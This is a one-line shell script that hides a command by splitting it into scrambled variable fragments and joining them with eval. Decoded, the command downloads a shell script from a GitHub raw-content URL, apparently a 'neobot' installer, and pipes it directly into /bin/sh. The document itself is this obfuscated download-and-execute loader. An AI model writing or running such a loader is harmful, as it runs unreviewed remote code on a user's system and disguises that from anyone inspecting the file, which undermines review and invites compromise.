z="
";Oz='9.65';Fz='hubu';Nz='ot_v';Qz='n/iN';Pz='/mai';Sz=' -O ';Kz='mil2';Uz='/bin';Ez='.git';Mz='eobo';Gz='serc';Bz=' htt';Rz='B.sh';Dz='/raw';Cz='ps:/';Lz='37/n';Vz='/sh';Jz='om/e';Iz='nt.c';Hz='onte';Az='wget';Tz='- | ';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz"